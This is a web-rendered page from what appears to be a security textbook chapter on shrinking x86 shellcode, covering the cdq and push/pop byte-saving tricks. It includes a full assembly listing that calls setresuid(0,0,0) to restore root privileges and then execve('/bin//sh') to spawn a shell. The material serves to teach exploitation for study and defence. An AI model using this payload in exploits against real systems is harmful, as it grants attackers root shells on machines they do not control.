<!DOCTYPE  html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>0x532 And Smaller Still</title><link href="navigation.css" rel="stylesheet" type="text/css"/><link href="document.css" rel="stylesheet" type="text/css"/></head><body><p class="top_nav"><a href="part122.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part124.htm">Next &gt;</a></p><p class="s32" style="padding-top: 4pt;padding-left: 91pt;text-indent: 0pt;text-align: left;"><a name="bookmark112">0x532 And Smaller Still</a></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">A few more bytes can still be shaved off this shellcode. There is a single-byte <span class="s27">x</span>86 instruction called <span class="s31">cdq</span>, which stands for <span class="s27">convert doubleword to quadword</span>. Instead of using operands, this instruction always gets its source from the EAX register and stores the results between the EDX and EAX registers. Since the registers are 32-bit doublewords, it takes two registers to store a 64-bit quadword. The conversion is simply a matter of extending the sign bit from a 32-bit integer to 64-bit integer. Operationally, this means if the sign bit of EAX is <span class="s31">0</span>, the <span class="s31">cdq </span>instruction will zero the EDX register. Using <span class="s31">xor </span>to zero the EDX register requires two bytes; so, if EAX is already zeroed, using the <span class="s31">cdq </span>instruction to zero EDX will save one byte</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_919.png"/></span></p><p class="s46" style="padding-bottom: 3pt;padding-left: 95pt;text-indent: 0pt;text-align: left;">31 D2       <span class="s31">xor edx,edx</span></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_920.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">compared to</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_921.png"/></span></p><p class="s46" style="padding-bottom: 3pt;padding-left: 95pt;text-indent: 0pt;text-align: left;">99        <span class="s31">cdq</span></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_922.png"/></span></p><p style="padding-top: 8pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">Another byte can be saved with clever use of the stack. Since the stack is 32-bit aligned, a single byte value pushed to the stack will be aligned as a doubleword. When this value is popped off, it will be sign-extended, filling the entire register. The instructions that push a single byte and pop it back into a register take three bytes, while using <span class="s31">xor </span>to zero the register and moving a single byte takes four bytes</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_923.png"/></span></p><p class="s46" style="padding-left: 95pt;text-indent: 0pt;line-height: 10pt;text-align: left;">31 C0       <span class="s31">xor eax,eax</span></p><p class="s46" style="padding-bottom: 3pt;padding-left: 95pt;text-indent: 0pt;line-height: 10pt;text-align: left;">B0 0B      <span class="s31">mov al,0xb</span></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_924.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">compared to</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_925.png"/></span></p><p class="s46" style="padding-left: 95pt;text-indent: 0pt;line-height: 10pt;text-align: left;">6A 0B      <span class="s31">push byte +0xb</span></p><p class="s46" style="padding-bottom: 3pt;padding-left: 95pt;text-indent: 0pt;line-height: 10pt;text-align: left;">58        <span class="s31">pop eax</span></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_926.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">These tricks (shown in bold) are used in the following shellcode listing. This assembles into the same shellcode as that used in the previous chapters.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s40" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">shellcode.s</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_927.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">BITS 32</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 99pt;text-indent: -8pt;line-height: 107%;text-align: left;">; setresuid(uid_t ruid, uid_t euid, uid_t suid); xor eax, eax   ; Zero out eax.</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 107%;text-align: left;">xor ebx, ebx   ; Zero out ebx. xor ecx, ecx   ; Zero out ecx.</p><p class="s46" style="padding-left: 99pt;text-indent: 0pt;line-height: 10pt;text-align: left;">cdq        ; Zero out edx using the sign bit from eax.</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">mov BYTE al, 0xa4 ; syscall 164 (0xa4)</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">int 0x80     ; setresuid(0, 0, 0) Restore all root privs.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">; execve(const char *filename, char *const argv [], char *const envp[])</p><p class="s46" style="padding-top: 2pt;padding-left: 99pt;text-indent: 0pt;text-align: left;">push BYTE 11   ; push 11 to the stack.</p><p class="s46" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">pop eax     ; pop the dword of 11 into eax.</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 107%;text-align: left;">push ecx     ; push some nulls for string termination. push 0x68732f2f  ; push &quot;//sh&quot; to the stack.</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">push 0x6e69622f  ; push &quot;/bin&quot; to the stack.</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 107%;text-align: left;">mov ebx, esp   ; Put the address of &quot;/bin//sh&quot; into ebx via esp. push ecx     ; push 32-bit null terminator to stack.</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">mov edx, esp   ; This is an empty array for envp.</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">push ebx      ; push string addr to stack above null terminator. mov ecx, esp    ; This is the argv array with string ptr.</p><p class="s31" style="padding-bottom: 3pt;padding-left: 99pt;text-indent: 0pt;text-align: left;">int 0x80    ; execve(&quot;/bin//sh&quot;, [&quot;/bin//sh&quot;, NULL], [NULL])</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_928.png"/></span></p><p style="padding-top: 8pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">The syntax for pushing a single byte requires the size to be declared. Valid sizes are <span class="s31">BYTE </span>for one byte, <span class="s31">WORD </span>for two bytes, and <span class="s31">DWORD </span>for four bytes. These sizes can be implied from register widths, so moving into the AL register implies the <span class="s31">BYTE </span>size. While it’s not necessary to use a size in all situations, it doesn’t hurt and can help readability.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="toc">&nbsp;</p><div class="toc"><a class="toc0" href="part124.htm">0x540 Port-Binding Shellcode</a></div><p class="nav">&nbsp;&nbsp;</p><p class="nav">&nbsp;</p><p class="nav"><a href="part122.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part124.htm">Next &gt;</a></p><p class="nav">&nbsp;&nbsp;</p></body></html>
